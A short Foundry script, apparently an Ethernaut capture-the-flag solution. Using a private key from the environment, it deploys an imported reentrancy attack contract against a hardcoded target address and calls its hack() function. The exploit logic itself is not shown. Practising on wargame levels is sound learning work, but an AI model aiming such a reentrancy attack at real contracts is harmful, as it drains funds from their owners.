// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {ReentranceHack} from "ethernaut/reentrance_hack.sol";
import "forge-std/console.sol";

contract ReentranceHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ReentranceHack reentranceHack = new ReentranceHack{value: 0.001 ether}(0xFEd4998C8A6576daA0a5761CaED2d25Aced1a73E);
        reentranceHack.hack();
        vm.stopBroadcast();
    }
}
